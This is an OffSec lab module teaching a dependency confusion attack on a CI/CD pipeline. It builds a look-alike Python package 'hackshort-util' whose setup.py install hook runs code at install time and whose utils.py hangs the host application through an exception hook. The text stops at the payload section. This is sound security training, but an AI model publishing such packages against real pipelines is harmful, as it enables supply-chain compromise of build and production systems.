Organizations implement _continuous integration_ (CI) and _continuous delivery_ (CD) systems to deliver their applications to customers quickly, easily, and repeatably. These systems automate many of the manual tasks that an administrator might have to do. While the repeatability and speed can increase the security of the product, CI/CD systems are often centralized systems that have access to many other services, applications, and servers. This can increase the risk landscape of CI/CD systems, making them great targets for attackers.

Because CI/CD systems are massive targets for attackers, organizations like _OWASP_ have created [top 10 lists](https://owasp.org/www-project-top-10-ci-cd-security-risks/) for the biggest security risks in CI/CD systems (_OWASP Top 10 CI/CD Security Risks_), shown below.

- CICD-SEC-1: Insufficient Flow Control Mechanisms
- CICD-SEC-2: Inadequate Identity and Access Management
- CICD-SEC-3: Dependency Chain Abuse
- CICD-SEC-4: Poisoned Pipeline Execution (PPE)
- CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
- CICD-SEC-6: Insufficient Credential Hygiene
- CICD-SEC-7: Insecure System Configuration
- CICD-SEC-8: Ungoverned Usage of 3rd Party Services
- CICD-SEC-9: Improper Artifact Integrity Validation
- CICD-SEC-10: Insufficient Logging and Visibility

This Module is the third in a 3-part series. In this series, we will cover eight of the ten risks directly. The two that will not be covered directly are _CICD-SEC-8: Ungoverned Usage of 3rd Party Services_ and _CICD-SEC-10: Insufficient Logging and Visibility_. CICD-SEC-8 won't be covered because it requires a third-party service like _GitHub_, and in order to maintain a consistent lab, we won't be using third-party services. However, the principles learned here can be applied to this risk as well. CICD-SEC-10 won't be covered directly since visibility requires manual intervention, which is out of scope for this module.

In this third part of the series, we will focus on _CICD-SEC-3: Dependency Chain Abuse_, _CICD-SEC-5: Insufficient Pipeline-Based Access Controls_, _CICD-SEC-7: Insecure System Configuration_, and _CICD-SEC-9: Improper Artifact Integrity Validation_.

_Dependency Chain Abuse_ refers to an attack in which a malicious user directs the build environment to download malicious code instead of the intended dependency. This can be done in many ways, including hijacking an official dependency, publishing a dependency with the same name in a different repository, or publishing a malicious package with a commonly mistyped name.

Insufficient _Pipeline-Based Access Controls_ refers to the potential compromise of systems and other resources by abusing the permission granted to the pipeline over those assets. Since CI/CD systems should be specific and repeatable, permissions should be scoped to the minimum that allows the pipeline to execute, but does not allow further compromise.

_Insecure System Configuration_ refers to a vulnerability in the various applications that make up a pipeline. These vulnerabilities could be due to misconfigurations in the settings or a vulnerable piece of code in the application.

_Improper Artifact Integrity Validation_ is the risk that allows an attacker to push malicious code, libraries, or other artifacts into a pipeline without any validation.

It's important to mention that many of the risks described in OWASP have significant overlap, and they should be used as general guidelines for the types of risks that a pipeline might experience.

In this Learning Module, we'll discover some public information that contains a reference to a dependency not in the public repository. Using this information, we'll publish a malicious package to the public repository. Our malicious repository will be downloaded by the builder and our custom code will be executed in production.

Once we have access to production, we'll scan the internal network and discover some additional services. From there, we'll tunnel into the automation server, where we'll be able to create an account and exploit a vulnerability in an installed plugin to obtain AWS access keys. Using those access keys, we'll be able to continue enumeration until we find an S3 bucket, which contains a [_Terraform state_](https://developer.hashicorp.com/terraform/language/state) file with administrator AWS keys.

We will cover the following Learning Units:

- Lab Design
- Information Gathering
- Dependency Chain Attack
- Compromising the Environment
- Wrapping Up

## 3.1. About the Public Cloud Labs

This module uses OffSec's Public Cloud Labs for challenges and walkthroughs. **OffSec's Public Cloud Labs** are a type of lab environment that will complement the learning experience with hands-on practice. In contrast to our more common VM labs found elsewhere in OffSec Learning materials (in which learners will connect to the lab through a VPN), learners using the Public Cloud Labs will interact directly with the cloud environment through the Internet.

OffSec believes strongly in the advantages of learning and practicing in a hands-on environment, and we believe that the OffSec Public Cloud Labs represent an excellent opportunity for both new learners and practitioners who want to stay sharp.

Please note the following:

1. The lab environment should not be used for activities not described or requested in the learning materials you encounter. It is not designed to serve as a playground to test additional items that are out of the scope of the learning module.
    
2. The lab environment should not be used to take action against any asset external to the lab. This is specifically noteworthy because some modules may describe or even demonstrate attacks against vulnerable cloud deployments for the purpose of describing how those deployments can be secured.
    
3. Existing rules and requirements against sharing OffSec training materials still apply. Credentials and other details of the lab are not meant to be shared. OffSec monitors activity in the Public Cloud Labs, including resource usage and monitoring for abnormal events that are not related to activities described in the learning modules.
    

Activities that are flagged as suspicious will result in an investigation. If the investigation determines that a student acted outside of the guidelines described above, or otherwise intentionally abused the OffSec Public Cloud Labs, OffSec may choose to rescind that learner's access to the OffSec Public Cloud Labs and/or terminate the learner's account.

Progress between sessions is not saved. Note that a Public Cloud Lab that is restarted will return to its original state. 1 Hour after the Public Cloud Lab starts, it will prompt to see if it is still in use. If there is no response, the lab session will end. Learners can continue to manually extend a session for up to ten hours. The learning material is designed to accommodate the limitations of the environment. No learner is expected or required to go complete all of the activities in a module within a single labs session. Even so, learners may choose to break up their learning into multiple sessions with the labs. We recommend making a note of the series of commands and actions that were completed previously so that new sessions can begin with quickly restoring the lab environment to the state it was in when the learner left. This is particularly the case when working through complex labs that require multiple actions.

## 3.2. Lab Design

In order to create a realistic lab design, multiple services need to be started at once. This includes the _Source Code Management_ (SCM) service, the automation server, any required repository services, the actual application, and any infrastructure needed to support the application. Because of this, the lab may take about 5 to 10 minutes to fully start.

In order to support the labs, we've included a few other auxiliary components that will help in exploiting the CI/CD system. When the lab starts, we will provide a DNS server that can be configured in a personal kali machine. This DNS system will be preconfigured with all the hosts in the lab.

In the real world, to effectively execute a dependency chain attack, we would need to upload the package to the official repositories. We cannot spam the real public repositories and forums for various reasons. Instead, we've created replicas of tech forums and a [_Python package index_](https://pypi.org/) (PyPI) that we'll be targeting.

Since we will be exploiting public applications, we would also benefit from a Kali instance with a public IP to capture shells. For this reason, we'll also be providing a kali instance with a public IP. This instance will be accessible via SSH using the username _kali_ and a randomly selected password for each lab.

This kali instance contains the [kali-linux-headless](https://www.kali.org/docs/general-use/metapackages/) metapackage, which installs all the default tools, but does not install a GUI. We'll also add the DNS configuration to this instance to avoid extra configuratio steps. While we can complete most of this lab on this instance, any part that requires a GUI (loading a web page in a browser, for example) should be done on a personal Kali instance.

The public components of this lab include:

- _Application_: In this lab, the target application is a URL shortener
- _Forum_: This would be similar to something like [Stack Overflow](https://stackoverflow.com/), [Quora](https://www.quora.com), or [Reddit](https://www.reddit.com/). Employees of organizations often post on these forums and leak potentially sensitive information.
- _Public Python Package Index_: Since we should not spam the official public PyPI server with malicious code, we've created a replica for us to target. We'll have to change the setting of our local Kali PIP client to default to this server for testing various exploits.

The public components will be accessible on the following subdomains when querying the custom DNS server.

|Component|Subdomain|
|---|---|
|Application|[app.offseclab.io](http://app.offseclab.io)|
|Forum|[forum.offseclab.io](http://forum.offseclab.io)|
|PyPI|[pypi.offseclab.io](http://pypi.offseclab.io)|

> Table 1 - Components of the Module

It's important to note that we've also created an account for this lab on the PyPI server. The username is _student_ and the password is _password_. We'll mention this again when we need to use the credentials.

The private components of this lab, which we will not have access to before the exploit, include:

- _Gitea_: This is the Source Code Management service.
- _Jenkins_: This is the automation service that orchestrates building various components of the infrastructure. This will become our target once we have access to production.
- _Internal Python Package Index_: In order to host the custom repository, an internal PyPI server is used. We will not be interacting with this server.

This Learning Unit covers the following Learning Objectives:

- Understand how to access the lab

## 3.2.1. Accessing the Labs

At the end of this section, we'll be able to start the lab. This provides us with:

- A DNS server's IP address
- A Kali IP address
- A Kali password

In order to access the services, we will need to configure our personal Kali machine (not the cloud instance) to use the provided DNS server and the pip client. Let's start with the DNS server. For this example, our DNS server will be hosted on 203.0.113.84.

We'll start by listing the active connections on our Kali machine using **nmcli** with the **connection** subcommand. Depending on how our kali is connected (via Wi-Fi, VM, etc.), the output may differ.

```
kali@kali:~$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  67f8ac63-7383-4dfd-ae42-262991b260d7  ethernet  eth0   
lo                  1284e5c4-6819-4896-8ad4-edeae32c64ce  loopback  lo 
```

> Listing 1 - Listing All Active Network Connections in Our Kali Machine

Our main network connection is named "Wired connection 1". We'll use this in the next command to set the DNS configuration. Then, we'll add the **modify** subcommand to **nmcli** and specify the name of the connection we want to modify. Let's set **ipv4.dns** to the IP of our DNS server. Once set, we'll use **systemctl** to restart the _NetworkManager_ service.

```
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"

kali@kali:~$ sudo systemctl restart NetworkManager

```

> Listing 2 - Setting DNS Server Configuration to ipv4.dns and Restarting NetworkManager Service

The hosted DNS server will only respond to the **offseclab.io** domain. You may specify additional DNS servers like 1.1.1.1 or 8.8.8.8 by adding them in a comma-separated list with the command above, for example, "203.0.113.84, 1.1.1.1, 8.8.8.8".

Once configured, we can confirm that the change propagated by verifying the DNS IP in our **/etc/resolv.conf** file. We'll also use **nslookup** to check if the DNS server is responding to the appropriate requests.

```
kali@kali:~$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver 203.0.113.84
...

kali@kali:~$ nslookup git.offseclab.io
Server:         203.0.113.84
Address:        203.0.113.84#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: 198.18.53.73
```

> Listing 3 - Verifying Changes for DNS and Checking DNS Server's Response to Our Requests

Based on the Listing above, we wrote our changes to the **resolv.conf** file and successfully queried one of the DNS entries.

Each lab restart will provide us with a new DNS IP, and we'll need to run the above commands to set it. Because the DNS server will be destroyed at the end of the lab, we'll need to delete this entry from our settings by running the **nmcli** command in Listing 2 with an empty string instead of the IP. We'll demonstrate this in the _Wrapping Up_ section.

Next, let's configure the pip client on our Kali instance. To use the cloud Kali instance for the **pip** commands, we'll need to make these updates there as well.

We can configure pip with the **~/.config/pip/pip.conf** file. We'll start by creating the **~/.config/pip/** directory using **mkdir** and the **-p** option, which will create the intermediate directories (**.config** and **pip**). Next, we'll use **nano** to create and edit **pip.conf**.

```
kali@kali:~$ mkdir -p ~/.config/pip/      

kali@kali:~$ nano ~/.config/pip/pip.conf

kali@kali:~$ cat -n  ~/.config/pip/pip.conf
1  [global]
2  index-url = http://pypi.offseclab.io
3  trusted-host = pypi.offseclab.io           
```

> Listing 4 - Configuring pip and Creating pip.conf File

On line 1, we'll specify the top level global configuration to ensure this populates every time our user uses **pip**. Next, we'll specify the [http://pypi.offseclab.io](http://pypi.offseclab.io) server, which is our replacement to the official [PyPI](https://pypi.org/) server. Finally, we'll need to specify that this is a _trusted-host_ because it uses _HTTP_ instead of _HTTPS_.

## 3.3. Information Gathering

As with every security assessment, we should start by gathering as much information as we can about the target environment. Collecting this information is crucial for being able to properly exploit an application.

This Learning Unit covers the following Learning Objectives:

- Enumerate the target applications
- Conduct open-source intelligence on the organization

## 3.3.1. Enumerating the Services

Let's start by visiting the target application (**app.offseclab.io**) and understanding how it functions.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/be8cb91962a4f95126c262a8cff05b20_MD5.jpg]]

Figure 1: Visiting the Target Application

The name of the target application is _HackShort_ and, based on the description, it can shorten long URLs into shorter ones. We also find a link (_HackShort's API_) to the application's API documentation.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/15b737827066e1c5089902deae340bcf_MD5.jpg]]

Figure 2: HackShort API Documentation

The first step lists that we need to generate an _access token_ to use the API. Let's follow that link.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/384becd9738453670a7b6645c869b4db_MD5.jpg]]

Figure 3: Token Generator

We'll enter a random email address and click _Get API Key_.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/b300fa591c638a1d166c9662d6c6c1e7_MD5.jpg]]

Figure 4: Generated Token

This takes us to a page that contains our _API token_.

In a traditional assessment, discovering the API documentation and obtaining an API token would have significantly increased our attack landscape. However, since we're targeting the pipeline and not the application, we'll continue with our enumeration. It's important to note that we would usually spend much more time attacking the application using a tool like [_Burp_](https://portswigger.net/burp).

Instead, let's continue enumerating the application to discover more information. We'll open up the _Developer Tools_ in _Firefox_ by right clicking anywhere on the page and clicking on _Inspect (Q)_. We can then navigate to the _Network_ tab, refresh the page, and inspect the first request and response.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/08024468178219a75d7d740388a92759_MD5.jpg]]

Figure 5: Network Tab in Developer Tools

One thing that stands out to us is the _Server_ headers. We'll notice that there are two headers with the value of _Caddy_. This indicates that the application is most likely behind two [Caddy](https://caddyserver.com/) reverse proxies. However, we also find one _Server_ header with the value of _Werkzeug/1.0.1 Python/3.11.2_. This informs us that the target application is most likely written in Python.

#### Labs

1. Discover the hidden http path on **app.offseclab.io**. Visiting it will provide you with a flag.

Answer

2. Discover the flag in the HTML source of the **app.offseclab.io**.

Answer

## 3.3.2. Conducting Open Source Intelligence

While enumerating the application and the pipeline is important, so is searching the open internet for anything that might relate to the target. This might include searching for the target's name on websites like [_Stack Overflow_](https://stackoverflow.com/), [_Reddit_](https://www.reddit.com/), and other forums. In some instances, this might not be feasible due to the number of potential matches. However, when the target is not a popular public tool, it might be fruitful.

Let's assume that we conducted a search for "hackshort" on a [forum](http://forum.offseclab.io) and discovered the following post:

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/cc2706aedfc6343290891a78d328bfe9_MD5.jpg]]

Figure 6: Forum Post about Hackshort

The user is complaining that they're unable to build the [_container image_](https://www.techtarget.com/searchitoperations/definition/container-image) and are asking for help. However, they've left some crucial information in this post that might enable us to gain code execution into their developer workstations or into their various environments. Specifically, we find that there is a Python module named _hackshort-util_.

Let's check the public repository and try to find if this utility is publicly accessible. If so, we'll have a glimpse into the internal source code. If it's not available, we might be able to conduct a dependency chain attack.

To download the package, we'll use **pip** with the **download** option. We'll specify the **hackshort-util** package we found in the forum post.

```
kali@kali:~$ pip download hackshort-util
Looking in indexes: http://pypi.offseclab.io
ERROR: Could not find a version that satisfies the requirement hackshort-util (from versions: none)
ERROR: No matching distribution found for hackshort-util
```

> Listing 5 - Attempting to Download hackshort-util Python Package

As shown in the Listing above, we did not find the package. This means that we should attempt to exploit a dependency chain attack.

## 3.4. Dependency Chain Attack

Dependency chain attacks (sometimes referred to as _dependency confusion_, _dependency hijacking_, or _substitution attacks_) are an attack in which a user or a package manager downloads a malicious package instead of the intended one. This might be done with a package sharing the same name but listed in a different repository, by [_typosquatting_](https://en.wikipedia.org/wiki/Typosquatting) an organization's name, or by typosquatting a common misspelling.

While typosquatting is a valid attack vector, we will be focusing on the confusion that a package manager might encounter when multiple packages have the same name.

This class of attack can lead to potential security breaches, data leaks, and arbitrary code execution in the application.

This Learning Unit covers the following Learning Objectives:

- Understand the attack
- Publishing a malicious package

## 3.4.1. Understanding the Attack

The primary idea of a dependency chain attack is that package managers, like Python Package Index (PyPI) for Python and _Node Package Manager_ (NPM) for _JavaScript_, will prioritize certain repositories or versions of a package when installing it. For example, an official public repository or a newer version of a package may be prioritized over custom repositories. However, public repositories often allow any user to publish custom repositories with any version number as long as the package name is not already in use.

This means that if an application requires a specific package from a custom internal repository, an attacker could upload a malicious package to a public repository with a newer version number. The package manager might then prioritize the malicious package over the official internal one.

The following graphic demonstrates what happens when a package manager checks multiple repositories, does not find a package in the public repository, and will then download the package found in the private repository.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/23149e197ca83c811a64bfc04c05f7e9_MD5.jpg]]

Figure 7: Flow of Downloading When Public Repo does not Contain Package

If the public repository _does_ contain the package, however, the package manager will still check both repositories, but will use the one with the newest version, depending on what was requested (more on this later).

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/e3108f3d7ea5a17b079eeea7b903b10f_MD5.jpg]]

Figure 8: Flow of Downloading when Public Repo does Contain Package

Every package manager has its own style for configuration and prioritization. Since the target in this lab uses Python, we'll focus on using pip. There are two configurations in pip that can change or add a repository to the search. The first is _index-url_, which is the default index to use to search. By default, it points to the public index at [https://pypi.org/simple](https://pypi.org/simple). The other configuration is _extra-index-url_, which adds additional indexes to search.

For pip, the dependency chain attack specifically exists because of the _extra-index-url_ configuration. When an administrator changes the default index with _index-url_, only the configured index url will be searched. However, by appending additional custom repositories with _extra-index-url_, multiple repositories will be searched, including the default public repository. If multiple repositories have the same package, the repository with the highest version matching the criteria will be selected.

We won't know if the target's pip configuration is using _extra-index-url_ to add additional custom repositories or if they're using _index-url_ to replace the default index until we try the attack. However, since each developer and environment needs to have this configuration, we have a higher chance that at least one might use _extra-index-url_.

We'll also need to match the versioning being requested by the target application. Each package manager handles the version request differently, but below are some examples of various pip version specifiers:

- _==_: This is the version matching clause. For example, if the requested package is _some-package==1.0.0_, only the 1.0.0 version would be downloaded. It's important to mention that wildcards can be used, so _some-package==1.0.*_ would also match 1.0.0, 1.0.1, and so on.
- _<=_: This the version matching clause that would match any version _equal or less than_ the specified version. For example, if _some-package<=1.0.0_ was requested, version 1.0.0, 0.0.9, and 0.8.9 would match, but 1.0.1 and 7.0.2 would not.
- _>=_: This the version matching clause that would match any version _equal or greater than_ the specified version. This is the opposite of the _<=_ clause.
- _~=_: This is the compatible release clause, which will download any version that should be compatible with the requested version. This assumes that the developer versions the package according to the specification. For example, if _some-package~=1.0.0_ is requested, 1.0.1, 1.0.5, and 1.0.9 would all match, but 1.2.0 and 2.0.0 would not.

In the forum post, we found the following requirement line for _hackshort-utils_:

```
hackshort-util~=1.1.0
```

> Listing 6 - Version Specifier for hackshort-util Requirment

In the forum post, the **requirements.txt** file uses the compatible release clause for version 1.1.0. This means that we'll need to make our version higher, but only after the second decimal, so 1.1.2 and above.

We also find a short glimpse of what the package imports when it's loaded into the application on the forum post:

```
from hackshort_util import utils
```

> Listing 7 - Importing utils Submodule from hackshort-util Package

It's important to note that during import, the package is referenced with an _underscore_ instead of a _dash_ (hackshort_util vs. hackshort-util). This is because dashes cause issues in Python syntax. When a developer has a dash in a package name, they often replace the dash with underscores, as shown in the Listing above. We can conclude that _hackshort_util_ is most likely from the _hackshort-util_ package. We'll also make note that the _utils_ submodule is imported from the package.

#### Labs

1. Which configuration makes pip vulnerable to a dependency chain attack?

Answer

2. Which of the following given version options will satisfy the below requirement?"

```
hackshort-util==2.*
```

A. 2.0.1

B. 3.4b

C. 22.0

Answer

## 3.4.2. Creating Our Malicious Package

Now that we know the name of the package, how it's imported, and the version of the package we should try using, we next need to build and publish the package to **pypi.offseclab.io**. At a minimum, a Python package typically consists of two files and two directories.

```
└── hackshort-util
    ├── setup.py
    └── hackshort_util
        └── __init__.py
```

> Listing 8 - Structure of a Python Package

The root directory will be the name of the package, in this case, **hackshort-util**.

In that directory, we'll find **setup.py**, which is the setup script. This script will _build_, _distribute_, and _install_ the module with [setuptools](https://setuptools.pypa.io/en/latest/). In this file, we will define the package and how to install it.

Instead of **setup.py**, we can also use **pyproject.toml** or **setup.cfg**.

Next, we have the **hackshort_util** directory. As stated earlier, Python syntax does not handle dashes well in package names, so the dash is replaced with an underscore. This will be the name that is used when importing the module into an application. As we found in the forum post, the module name was _hackshort_util_.

Finally, we have a **__init__.py** file. This file is used to indicate that the directory is a Python module. While no [longer needed if using a namespace package](https://docs.python.org/3/reference/import.html#namespace-packages), we're going to create a [regular package](https://docs.python.org/3/reference/import.html#regular-packages), which does require it.

Let's create a very basic Python package that we can install locally to test out. We'll create the **hackshort-util** directory and the **hackshort_util** subdirectory using **mkdir**. Next, we can create **setup.py** using **nano**. Finally, we'll use **touch** to create an empty **__init__.py** file.

```
kali@kali:~$ mkdir hackshort-util

kali@kali:~$ cd hackshort-util           
                                                                                                        
kali@kali:~/hackshort-util$ nano setup.py

kali@kali:~/hackshort-util$ cat -n setup.py
01  from setuptools import setup, find_packages
02
03  setup(
04      name='hackshort-util',
05      version='1.1.4',
06      packages=find_packages(),
07      classifiers=[],
08      install_requires=[],
09      tests_require=[],
10  )

kali@kali:~/hackshort-util$ mkdir hackshort_util

kali@kali:~/hackshort-util$ touch hackshort_util/__init__.py

```

> Listing 9 - Creating Most Basic Python Package

While the directory structure is important, the **setup.py** file is the main component. Let's review its contents.

On line 1, we import the necessary functions from _setuptools_. On lines 3-10, we call the _setup_ function with multiple arguments as the configuration for the package. Line 4 configures the _name_; this needs to match the name of the package we are targeting. This is the name that will be referenced on the PyPI server, not during import, so using a dash is allowed. Next, on line 5, we configure the _version_.

In order for our package to be downloaded, the version comparison done at install time must be higher than the one installed in the local repository, but not too high, or it won't be downloaded either. Based on the information we found earlier, we chose _1.1.4_. Line 6 configures how packages should be found when imported. The _find_packages_ function is a default function to search the directory structure for files.

At this point, we have the bare minimum to build and use a package without errors. Let's run **setup.py** and use the **sdist** argument to create a [_Source Distribution_](https://setuptools.pypa.io/en/latest/deprecated/distutils/sourcedist.html).

A source distribution is a collection of all of the files that comprise a Python package.

```
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
running sdist
running egg_info
writing hackshort_util.egg-info/PKG-INFO
writing dependency_links to hackshort_util.egg-info/dependency_links.txt
writing top-level names to hackshort_util.egg-info/top_level.txt
reading manifest file 'hackshort_util.egg-info/SOURCES.txt'
writing manifest file 'hackshort_util.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating hackshort-util-1.1.4
creating hackshort-util-1.1.4/hackshort_util
creating hackshort-util-1.1.4/hackshort_util.egg-info
copying files to hackshort-util-1.1.4...
copying setup.py -> hackshort-util-1.1.4
copying hackshort_util/__init__.py -> hackshort-util-1.1.4/hackshort_util
copying hackshort_util/utils.py -> hackshort-util-1.1.4/hackshort_util
copying hackshort_util.egg-info/PKG-INFO -> hackshort-util-1.1.4/hackshort_util.egg-info
copying hackshort_util.egg-info/SOURCES.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
copying hackshort_util.egg-info/dependency_links.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
copying hackshort_util.egg-info/top_level.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
Writing hackshort-util-1.1.4/setup.cfg
Creating tar archive
removing 'hackshort-util-1.1.4' (and everything under it)
```

> Listing 10 - Running the Newly Created Python Package

When we ran this command, Python packaged up the source of our custom package. It also created various metadata files (_egg-info_); however, that's not important for us. The actual package was saved in the **dist** folder with the name **hackshort-util-1.1.4.tar.gz**.

Let's use **pip install** to install our package and check if it works. Instead of providing **pip** a package name to search the remote repositories, we'll provide it with a direct filesystem path to our package.

```
kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
Defaulting to user installation because normal site-packages is not writeable
Looking in indexes: http://pypi.offseclab.io, http://127.0.0.1
Processing ./dist/hackshort-util-1.1.4.tar.gz
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: hackshort-util
  Building wheel for hackshort-util (setup.py) ... done
  Created wheel for hackshort-util: filename=hackshort_util-1.1.4-py3-none-any.whl size=1188 sha256=2b00a9631c7fb9e1094b6c6ac70bd4424f1ecc3110e05dc89b6352229ed58f93
  Stored in directory: /home/kali/.cache/pip/wheels/da/63/05/afd9e305b95f17a67a64eaa1e62f8acfd4fe458712853c2c3d
Successfully built hackshort-util
Installing collected packages: hackshort-util
Successfully installed hackshort-util-1.1.4
```

> Listing 11 - Installing hackshort-util Locally

The installation was successful! Next, let's attempt to import _hackshort_util_. Although the package does not contain anything of value, we should be able import it. However, if we attempt to import the _hackshort_util_ package from the current directory, the **hackshort_util** directory will be used instead of the package we just installed. Instead, we'll open a new terminal tab and run **python3** from our home directory. While this is a small detail, since the source should be the same regardless, we always want to make sure we're testing the build in case something is misconfigured.

```
kali@kali:~$ python3                                       
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hackshort_util
>>> print(hackshort_util)
<module 'hackshort_util' from '/home/kali/.local/lib/python3.11/site-packages/hackshort_util/__init__.py'>
```

> Listing 12 - Importing and Using hackshort_util Package

As shown in the listing above, we were able to install and use our module!

Next, we'll need to make the package more useful in order to result in code execution. First, let's uninstall the package so we can reinstall it with our updates later. We'll do this by running **pip uninstall**, but this time, we have to provide the package name, **hackshort-util**.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util                   
Found existing installation: hackshort-util 1.1.4
Uninstalling hackshort-util-1.1.4:
  Would remove:
    /home/kali/.local/lib/python3.11/site-packages/hackshort_util-1.1.4.dist-info/*
    /home/kali/.local/lib/python3.11/site-packages/hackshort_util/*
Proceed (Y/n)? Y
  Successfully uninstalled hackshort-util-1.1.4
```

> Listing 13 - Uninstalling hackshort-util Package

With the package uninstalled, we're ready to continue.

## 3.4.3. Command Execution During Install

We now have two locations where we can place a payload. The first is in **setup.py**. If we place it here, we can achieve command execution during the installation of the package. This option would most likely result in command execution during build time.

The second option is in the _utils_ submodule, which we discovered is in use based on the forum post. For this second option, we would have to create a **utils.py** file. Placing our payload here would most likely result in command execution in the various environments, including production.

In the real world, we would most likely perform both options in order to cast a wider net. However, for this demonstration, our goal is only to obtain code execution in production. We'll nevertheless demonstrate basic code execution with the first option and leave obtaining a shell in the builder as an exercise.

Let's start with the first option. As mentioned, we need to edit the **setup.py** file. Some packages require a very extensive install process, which includes compilation. For this, _setuptools_ supports a feature where we can specify a custom installer function to run at install time named _cmdclass_.

```
kali@kali:~/hackshort-util$ cat -n setup.py            
01  from setuptools import setup, find_packages
02  from setuptools.command.install import install
03
04  class Installer(install):
05      def run(self):
06          install.run(self)
07          with open('/tmp/running_during_install', 'w') as f:
08              f.write('This code was executed when the package was installed')
09
10  setup(
11      name='hackshort-util',
12      version='1.1.4',
13      packages=find_packages(),
14      classifiers=[],
15      install_requires=[],
16      tests_require=[],
17      cmdclass={'install': Installer}
18  )
19
```

> Listing 14 - Adding Custom Code to Run During Install

On line 17, we add a new _cmdclass_ argument to the _setup_ function, which is set to the value of a _dictionary_. The _install_ key used here is necessary to instruct pip to use a specific class during install. In this example, we link it to the _Installer_ class, which is defined on lines 4-8.

The _Installer_ class accepts a variable that will be passed in by _setuptools_ when this class is initialized. For this to work, we'll need to import the _install_ submodule, which can be found on line 2. On line 5, we specify the _run_ function that will be executed during the installation. On line 6, we specify _install.run(self)_, which will continue the normal installation portion.

So far, everything we've explained is to continue the installation process as expected. However, now we have a place to configure custom code to be executed. On lines 7 and 8, we've added a code snippet that will create the **/tmp/running_during_install** file to prove we've reached command execution.

Let's try to install this package and verify that the command will be executed. We'll first delete the existing package using **rm ./dist/hackshort-util-1.1.4.tar.gz**. Then, we'll verify that **/tmp/running_during_install** does not already exist. After that, we'll build the package.

```
kali@kali:~/hackshort-util$ rm ./dist/hackshort-util-1.1.4.tar.gz

kali@kali:~/hackshort-util$ cat /tmp/running_during_install   
cat: /tmp/running_during_install: No such file or directory

kali@kali:~/hackshort-util$ python3 ./setup.py sdist                      
...
```

> Listing 15 - Removing the Existing Package and Building the New Package

Now that we've rebuilt the package, let's attempt to install it and check if the installation created our file.

```
kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
...

kali@kali:~/hackshort-util$ cat /tmp/running_during_install           
This code was executed when the package was installed   
```

> Listing 16 - Installing the New Package and Checking if Custom Code Executed

At this point, we have obtained command execution during install. As mentioned earlier, we'll leave obtaining a reverse shell as an independent exercise. For now, let's move on to achieving code execution during runtime.

## 3.4.4. Command Execution During Runtime

Now that we have code execution during the installation process, let's move on to obtaining code execution during runtime. To do this, we need to know how the developers use the package. Referencing the forum post we found earlier, we can find that the application imports the _utils_ submodule from _hackshort_util_.

```
from hackshort_util import utils
```

> Listing 17 - Code Snippet Showing the Importing of utils Submodule from hackshort_util Module

This means that we'll have to create a **utils.py** file in the **hackshort_util** directory or Python will throw an error. However, we don't know what kind of functions exist in this submodule, so when the application goes to call the functions, it will throw another error.

To remedy this, we'll create a wildcard function that will be executed regardless of the name.

Nevertheless, there's a chance that our standard function won't return the appropriate value, resulting in another exception. To remedy this, we'll create an [_exception hook_](https://docs.python.org/3/library/sys.html#sys.excepthook) to catch any exception the application throws and block execution. While this might crash the application for users, it will give us time to conduct some additional reconnaissance of the environment.

```
kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
                                                                                                        
kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
01  import time
02  import sys
03
04  def standardFunction():
05          pass
06
07  def __getattr__(name):
08          pass
09          return standardFunction
10
11  def catch_exception(exc_type, exc_value, tb):
12      while True:
13          time.sleep(1000)
14
15  sys.excepthook = catch_exception

```

> Listing 18 - Creating utils.py File with Exception Hook Function

Lines 1 and 2 will import the necessary libraries. We'll keep this basic since we don't know what the target has installed.

On lines 4-5, we create the standard function (_standardFunction()_) that will get executed by any function call to this submodule. The _pass_ on line 5 instructs the application to continue execution without doing anything.

On lines 7-9, we'll define a special function named ___getattr___ that will get called when a function name does not exist. On line 9, we'll return the standard function defined on lines 4-5, effectively creating our wildcard function.

On line 11, we'll define the function to catch all exceptions. This function will accept three arguments that are passed when the application throws an exception. On line 12, we'll create an infinite loop that will sleep for 1000 seconds (line 13) on each iteration.

Finally, on line 15, we'll specify the exception hook to be equal to the function we just defined.

Let's uninstall the existing _hackshort-util_ package, then rebuild and reinstall it.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
...

kali@kali:~/hackshort-util$ python3 ./setup.py sdist
...

kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
...
```

> Listing 19 - Uninstalling, Rebuilding, and Reinstalling hackshort-util Package

Next, let's attempt to use the module in Python to test the functionality we implemented. We'll import the submodule as shown in the forum post. Then, we'll try to run any function and ensure we don't throw an error. Finally, we'll attempt to divide by 0 and expect to be thrown into an infinite loop.

```
kali@kali:~$ python3                 
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from hackshort_util import utils
>>> utils.run()
>>> 1/0

```

> Listing 20 - Testing Our Newly Created Package

As expected, running any function doesn't throw an error, and dividing by 0 places us in an infinite loop. Now that we have a strong base, we can add our payload.

## 3.4.5. Adding a Payload

